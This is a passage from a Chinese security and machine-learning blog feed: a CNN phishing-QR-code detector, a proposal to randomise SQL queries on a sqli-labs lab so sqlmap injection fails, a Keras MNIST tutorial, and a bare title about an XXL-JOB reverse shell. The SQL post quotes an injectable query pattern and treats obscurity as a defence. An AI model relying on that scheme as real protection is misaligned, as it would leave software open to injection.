32个过滤器，过滤器大小是3×3，32×26×26</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>)) <span class="comment">#64×24×24</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Dropout(<span class="number">0.25</span>))</span><br><span class="line">model.add(Flatten()) <span class="comment">#降维：将64×12×12降为1维（即把他们相乘起来）</span></span><br><span class="line">model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>)) <span class="comment">#全连接2层</span></span><br></pre></td></tr></table></figure><h3 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h3><p>使用测试集40000多个图片对模型迭代训练到12个epoch，模型准确率能够高达80%左右。这里我尝试了再次多增加几个epoch，但是验证集的准确率并没有增加，二训练集的准确率增加了，说明模型过拟合了，因此准确率只能达到80%左右。损失值和准确率曲线变化图如下</p><p><img src="/images/loss.png" alt="loss"><img src="/images/acc.png" alt="acc">     </p><p>左边是损失值函数图像，右边是准确率图像。</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>偶然，我的发小说一个不认识的人给他发了一个二维码，咳咳。于是突然想起自己刚写的基于CNN的恶意二维码识别检测。</p><img src="/images/5065d0f35e82af08cf1da144697d627.jpg" width=300 /><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20200811114739.png" alt="TIM截图20200811114739"></p><p>只有两个类别，所以有两个数字。分别对应是<code>正常url的概率</code>与<code>恶意url的概率</code>，可以看到我朋友发的这个二维码包含恶意url的概率直接是100%。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前钓鱼的方式层出不穷，使用二维码钓鱼也算是另辟蹊径了。关于如何提高针对二维码钓鱼的攻击还需有待提高。</p><h3 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h3><p>[<a href="https://github.com/unihac/Machine-Learning/tree/master/Malcious%20QR%20code]">https://github.com/unihac/Machine-Learning/tree/master/Malcious%20QR%20code]</a>(<a href="https://github.com/unihac/Machine-Learning/tree/master/Malcious">https://github.com/unihac/Machine-Learning/tree/master/Malcious</a> QR code)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基于深度学习的二维码钓鱼检测&quot;&gt;&lt;a href=&quot;#基于深度学习的二维码钓鱼检测&quot; class=&quot;headerlink&quot; title=&quot;基于深度学习的二维码钓鱼检测&quot;&gt;&lt;/a&gt;基于深度学习的二维码钓鱼检测&lt;/h1&gt;&lt;h2 id=&quot;0x01前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="机器学习" scheme="http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>动态代码防御机制</title>
    <link href="http://example.com/2020/08/04/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2020/08/04/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/</id>
    <published>2020-08-04T00:46:07.000Z</published>
    <updated>2020-08-04T00:59:35.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态代码防御机制"><a href="#动态代码防御机制" class="headerlink" title="动态代码防御机制"></a>动态代码防御机制</h1><p>   关于动态代码防御机制，是自己瞎取的名字，目前我还没有看到过类似的文章，如果有前辈已经发表过，纯属巧合！！！我仅是突发奇想了这么一个东西，说不上高大上。也就是证明有这么回事的存在。说不定各位在座的大佬有更好的想法去完善这个方案！</p><h2 id="动态代码防御机制介绍"><a href="#动态代码防御机制介绍" class="headerlink" title="动态代码防御机制介绍"></a>动态代码防御机制介绍</h2><p>   现在的各种攻击都是针对静态代码的攻击，例如接受用户名和密码的处理语句：select * from users where id=’id’ and pwd=’pwd’。攻击者总可以想到一种方式进行攻击或者绕过，因为后端代码是写死了的，他只能按照这种方式处理，所有难以有所避免的（当然web防火墙和代码过滤也能解决，但是这里我想说的就是动态防御机制这个核心思想）。随着时代的发展也诞生出一批相当优秀的工具，例如作为sql注入的神器sqlmap，便能轻轻松松对安全防护比较弱的网站发起攻击。甚至还能直接上传文件、获取shell等操作。</p><p>   这种工具的诞生也给攻击者带来了便捷，能够很方便的对一个网站发起攻击，大多数情况下，会使用sqlmap先走一波看看啥情况，然后再人工分析。这时候想，如果后端代码是动态随机的，那么会有什么情况？这样后端代码就活动起来了，给攻击者无论是使用工具或者人工分析都带来困难了。要想注入成功，那就需要各位仁兄运气了！</p><h2 id="SQL注入的动态防御实践"><a href="#SQL注入的动态防御实践" class="headerlink" title="SQL注入的动态防御实践"></a>SQL注入的动态防御实践</h2><p>   这里使用的是phpstudy搭建的一个sqli-labs环境进行操作。搭建好的效果如下：</p><p><img src="/images/clip_image002-1596502683513.jpg" alt="img"></p><p>下面就用sqli-labs第一关作为实验对象。我们看下后端代码的sql代码：</p><p><img src="/images/clip_image004-1596502683514.jpg" alt="img"></p><p>很明显，我们只需要闭合这个单引号就能实现注入了，这会儿直接采用sqlmap进行注入，结果如下：</p><p><img src="/images/clip_image006-1596502683514.jpg" alt="img"></p><p>可以看到payload是用单引号闭合注入。然后修改下sql代码，使用sqlmap进行注入的情况如下：</p><p><img src="/images/clip_image008-1596502683514.jpg" alt="img"></p><p>使用sqlmap注入，得到的payload如下</p><p><img src="/images/clip_image010-1596502683514.jpg" alt="img"></p><p>其实就是把单引号注入转变成了双引号注入。接下载就是动态代码防御机制了，我在这个代码中加入了随机数，通过随机的设置sql查询不断变换，导致sqlmap不能实现注入。添加的代码如下：</p><p><img src="/images/clip_image012-1596502683514.jpg" alt="img"></p><p>然后再使用sqlmap进行注入，效果如下：</p><p><img src="/images/clip_image014-1596502683514.jpg" alt="img"></p><p>Sqlmap工具突然就会失效了。在以前版本的sqlmap中比较容易实现，现在使用新版本sqlmap比较稍微困难了点。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的这种后端代码动态变化方式，能够给防御带来一定程度上的帮助。而且我感觉这个思想应该能用在更多的场景中，还需要大家一起探索探索。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;动态代码防御机制&quot;&gt;&lt;a href=&quot;#动态代码防御机制&quot; class=&quot;headerlink&quot; title=&quot;动态代码防御机制&quot;&gt;&lt;/a&gt;动态代码防御机制&lt;/h1&gt;&lt;p&gt;   关于动态代码防御机制，是自己瞎取的名字，目前我还没有看到过类似的文章，如果有前辈已经发</summary>
      
    
    
    
    
    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>CNN卷积神经网络</title>
    <link href="http://example.com/2020/07/15/CNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"/>
    <id>http://example.com/2020/07/15/CNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</id>
    <published>2020-07-15T06:26:15.000Z</published>
    <updated>2021-02-04T05:13:51.828Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CNN卷积神经网络"><a href="#CNN卷积神经网络" class="headerlink" title="CNN卷积神经网络"></a>CNN卷积神经网络</h1><h2 id="图片组成"><a href="#图片组成" class="headerlink" title="图片组成"></a>图片组成</h2><p><strong>这里引用别人<a href="https://blog.csdn.net/Strive_0902/article/details/78023080">博客</a>内容解释</strong></p><p>一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。</p><p><img src="/images/20170918200619273" alt="img"></p><a id="more"></a><p><img src="/images/20170918202312375" alt="img"></p><p>例如上图片尺寸是$500 \cdot 338$ 的，表示图片是由一个$500 \cdot 338$的像素点矩阵构成的，共有$500 \cdot 338 = 149000$个像素点。 一个像素点的颜色是由RGB三个值来表现的，所以像素点矩阵对应三个颜色向量矩阵，分别是R矩阵($500 \cdot 338$)，G矩阵($500 \cdot 338$)，B矩阵($500 \cdot 338$)。如果每个矩阵的第一行第一列的值分别为：$R：240，G：223，B：204，$所以这个像素点的颜色就是$（240,223,204）$</p><p>灰度是表明图像明暗的数值，即黑白图像中点的颜色深度，范围一般从0到255，白色为255 ，黑色为0，故黑白图片也称灰度图像。灰度值指的是单个像素点的亮度。灰度值越大表示越亮。  </p><p>灰度就是没有色彩，RGB色彩分量全部相等。图像的灰度化就是让像素点矩阵中的每一个像素点都满足关系：R=G=B，此时的这个值叫做灰度值。如RGB(100,100,100)就代表灰度值为100,RGB(50,50,50)代表灰度值为50。</p><h2 id="一个简单的CNN卷积神经网络"><a href="#一个简单的CNN卷积神经网络" class="headerlink" title="一个简单的CNN卷积神经网络"></a>一个简单的CNN卷积神经网络</h2><p>卷积神经网络处理图片的过程如下图</p><p>·基于MNIST数据集的卷积神经网络</p><p>导入需要的包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Conv2D, Flatten, MaxPooling2D, Dropout</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> to_categorical</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><pre><code>Using TensorFlow backend.</code></pre><p>使用 GPU 加速(可选)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[<span class="string">&quot;CUDA_VISIBLE_DEVICES&quot;</span>] = <span class="string">&quot;0&quot;</span></span><br></pre></td></tr></table></figure><p>定义一些全局变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置全局变量</span></span><br><span class="line">num_classes = <span class="number">10</span>  <span class="comment"># 类别</span></span><br><span class="line">batch_size = <span class="number">128</span> <span class="comment"># 批次大小</span></span><br><span class="line">epochs = <span class="number">12</span>  <span class="comment"># 训练多少次</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置图片维度</span></span><br><span class="line">img_rows, img_cols = <span class="number">28</span>, <span class="number">28</span>  <span class="comment"># 图片的大小</span></span><br></pre></td></tr></table></figure><p>加载数据并处理数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载 MNIST 数据集</span></span><br><span class="line">(x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line"><span class="comment"># 处理数据集：针对训练集归一化，针对测试集one-hot编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断深度学习框架需要输入的维度</span></span><br><span class="line"><span class="keyword">if</span> K.image_data_format() == <span class="string">&quot;channels_first&quot;</span>:</span><br><span class="line">    x_train = x_train.reshape(x_train.shape[<span class="number">0</span>], <span class="number">1</span>, img_rows, img_cols)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">1</span>, img_rows, img_cols)</span><br><span class="line">    input_shape = (<span class="number">1</span>, img_rows, img_cols)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    x_train = x_train.reshape(x_train.shape[<span class="number">0</span>], img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line">    input_shape = (img_rows, img_cols, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 归一化 </span></span><br><span class="line">x_train = x_train.astype(np.float32) / <span class="number">255</span></span><br><span class="line">x_test = x_test.astype(np.float32) / <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. one-hot 编码</span></span><br><span class="line">y_train = to_categorical(y_train, num_classes)</span><br><span class="line">y_test = to_categorical(y_test, num_classes)</span><br></pre></td></tr></table></figure><p>构建卷积神经网络</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建卷积神经网络模型</span></span><br><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv2D(<span class="number">32</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=input_shape)) <span class="comment"># 32个过滤器，过滤器大小是3×3，32×26×26</span></span><br><span class="line">model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>)) <span class="comment">#64×24×24</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Dropout(<span class="number">0.25</span>))</span><br><span class="line">model.add(Flatten()) <span class="comment">#降维：将64×12×12降为1维（即把他们相乘起来）</span></span><br><span class="line">model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>)) <span class="comment">#全连接2层</span></span><br></pre></td></tr></table></figure><p>编译模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译模型</span></span><br><span class="line">model.<span class="built_in">compile</span>(loss=keras.losses.categorical_crossentropy, optimizer=keras.optimizers.Adadelta(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure><p>训练神经网络</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 神经网络</span></span><br><span class="line">history = model.fit(x_train, y_train, batch_size=<span class="number">32</span>, epochs=epochs, verbose=<span class="number">1</span>, validation_data=(x_test, y_test))</span><br></pre></td></tr></table></figure><pre><code>Train on 60000 samples, validate on 10000 samplesEpoch 1/1260000/60000 [==============================] - 23s 378us/step - loss: 0.1819 - acc: 0.9451 - val_loss: 0.0455 - val_acc: 0.9854Epoch 2/1260000/60000 [==============================] - 18s 295us/step - loss: 0.0755 - acc: 0.9777 - val_loss: 0.0393 - val_acc: 0.9879Epoch 3/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0567 - acc: 0.9829 - val_loss: 0.0392 - val_acc: 0.9869Epoch 4/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0521 - acc: 0.9848 - val_loss: 0.0370 - val_acc: 0.9883Epoch 5/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0487 - acc: 0.9855 - val_loss: 0.0337 - val_acc: 0.9887Epoch 6/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0466 - acc: 0.9862 - val_loss: 0.0314 - val_acc: 0.9894Epoch 7/1260000/60000 [==============================] - 18s 296us/step - loss: 0.0446 - acc: 0.9867 - val_loss: 0.0285 - val_acc: 0.9910Epoch 8/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0426 - acc: 0.9871 - val_loss: 0.0295 - val_acc: 0.9909Epoch 9/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0419 - acc: 0.9877 - val_loss: 0.0367 - val_acc: 0.9893Epoch 10/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0406 - acc: 0.9882 - val_loss: 0.0318 - val_acc: 0.9905Epoch 11/1260000/60000 [==============================] - 18s 298us/step - loss: 0.0397 - acc: 0.9885 - val_loss: 0.0282 - val_acc: 0.9909Epoch 12/1260000/60000 [==============================] - 18s 297us/step - loss: 0.0369 - acc: 0.9894 - val_loss: 0.0395 - val_acc: 0.9888</code></pre><p>作出训练期间 loss 和 accuracy 的图像</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.plot(history.history[<span class="string">&#x27;loss&#x27;</span>])</span><br><span class="line">plt.plot(history.history[<span class="string">&#x27;acc&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;model accuracy&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;epoch&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;loss&#x27;</span>, <span class="string">&#x27;accuracy&#x27;</span>], loc=<span class="string">&#x27;lower right&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/images/output_25_0.png" alt="png"></p><p>评价模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 评价模型</span></span><br><span class="line">score = model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">&quot;Test loss：&quot;</span>, score[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;Test accuracy: &quot;</span>, score[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><pre><code>Test loss： 0.03945192432178337Test accuracy:  0.9888</code></pre><h2 id="LetNet5-模型"><a href="#LetNet5-模型" class="headerlink" title="LetNet5 模型"></a>LetNet5 模型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">model = Sequential()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个卷积层  28*28*1  --&gt;  </span></span><br><span class="line">model.add(Conv2D(<span class="number">6</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个卷积层</span></span><br><span class="line">model.add(Conv2D(<span class="number">16</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展平</span></span><br><span class="line">model.add(Flatten())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">120</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">84</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全连接层</span></span><br><span class="line">model.add(Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#　模型编译</span></span><br><span class="line">model.<span class="built_in">compile</span>(loss=keras.metrics.categorical_crossentropy, optimizer=keras.optimizers.Adam(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">model.summary()</span><br></pre></td></tr></table></figure><pre><code>_________________________________________________________________Layer (type)                 Output Shape              Param #   =================================================================conv2d_5 (Conv2D)            (None, 24, 24, 6)         156       _________________________________________________________________max_pooling2d_4 (MaxPooling2 (None, 12, 12, 6)         0         _________________________________________________________________conv2d_6 (Conv2D)            (None, 8, 8, 16)          2416      _________________________________________________________________max_pooling2d_5 (MaxPooling2 (None, 4, 4, 16)          0         _________________________________________________________________flatten_3 (Flatten)          (None, 256)               0         _________________________________________________________________dense_6 (Dense)              (None, 120)               30840     _________________________________________________________________dense_7 (Dense)              (None, 84)                10164     _________________________________________________________________dense_8 (Dense)              (None, 10)                850       =================================================================Total params: 44,426Trainable params: 44,426Non-trainable params: 0_________________________________________________________________</code></pre><h2 id="AlexNet-模型"><a href="#AlexNet-模型" class="headerlink" title="AlexNet 模型"></a>AlexNet 模型</h2><p>模型架构如下：<br>一共有5个卷积层（Conv2D），8个神经网络层（Conv2D + Dense）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建模型序列  </span></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="comment">#第一层卷积网络，使用96个卷积核，大小为11x11步长为4， 要求输入的图片为227x227， 3个通道，不加边，激活函数使用relu</span></span><br><span class="line">model.add(Conv2D(<span class="number">96</span>, (<span class="number">11</span>, <span class="number">11</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>,</span><br><span class="line">                 kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 池化层</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># 第二层加边使用256个5x5的卷积核，加边，激活函数为relu</span></span><br><span class="line">model.add(Conv2D(<span class="number">256</span>, (<span class="number">5</span>, <span class="number">5</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment">#使用池化层，步长为2</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"><span class="comment"># 第三层卷积，大小为3x3的卷积核使用384个</span></span><br><span class="line">model.add(Conv2D(<span class="number">384</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 第四层卷积,同第三层</span></span><br><span class="line">model.add(Conv2D(<span class="number">384</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line"><span class="comment"># 第五层卷积使用的卷积核为256个，其他同上</span></span><br><span class="line">model.add(Conv2D(<span class="number">256</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">1</span>, <span class="number">1</span>), padding=<span class="string">&#x27;same&#x27;</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;uniform&#x27;</span>))</span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">3</span>, <span class="number">3</span>), strides=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">model.add(Flatten())</span><br><span class="line">model.add(Dense(<span class="number">4096</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(<span class="number">4096</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>, optimizer=<span class="string">&#x27;sgd&#x27;</span>, metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">model.summary()</span><br></pre></td></tr></table></figure><pre><code>_________________________________________________________________Layer (type)                 Output Shape              Param #   =================================================================conv2d_7 (Conv2D)            (None, 28, 28, 96)        11712     _________________________________________________________________max_pooling2d_6 (MaxPooling2 (None, 13, 13, 96)        0         _________________________________________________________________conv2d_8 (Conv2D)            (None, 13, 13, 256)       614656    _________________________________________________________________max_pooling2d_7 (MaxPooling2 (None, 6, 6, 256)         0         _________________________________________________________________conv2d_9 (Conv2D)            (None, 6, 6, 384)         885120    _________________________________________________________________conv2d_10 (Conv2D)           (None, 6, 6, 384)         1327488   _________________________________________________________________conv2d_11 (Conv2D)           (None, 6, 6, 256)         884992    _________________________________________________________________max_pooling2d_8 (MaxPooling2 (None, 2, 2, 256)         0         _________________________________________________________________flatten_4 (Flatten)          (None, 1024)              0         _________________________________________________________________dense_9 (Dense)              (None, 4096)              4198400   _________________________________________________________________dropout_3 (Dropout)          (None, 4096)              0         _________________________________________________________________dense_10 (Dense)             (None, 4096)              16781312  _________________________________________________________________dropout_4 (Dropout)          (None, 4096)              0         _________________________________________________________________dense_11 (Dense)             (None, 10)                40970     =================================================================Total params: 24,744,650Trainable params: 24,744,650Non-trainable params: 0_________________________________________________________________</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CNN卷积神经网络&quot;&gt;&lt;a href=&quot;#CNN卷积神经网络&quot; class=&quot;headerlink&quot; title=&quot;CNN卷积神经网络&quot;&gt;&lt;/a&gt;CNN卷积神经网络&lt;/h1&gt;&lt;h2 id=&quot;图片组成&quot;&gt;&lt;a href=&quot;#图片组成&quot; class=&quot;headerlink&quot; title=&quot;图片组成&quot;&gt;&lt;/a&gt;图片组成&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;这里引用别人&lt;a href=&quot;https://blog.csdn.net/Strive_0902/article/details/78023080&quot;&gt;博客&lt;/a&gt;内容解释&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一张图片由很多像素点组成，一个像素点又是由三个通道(R/G/B)融合而成的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/20170918200619273&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="机器学习" scheme="http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>XXL-JOB反弹shell之打野</title>
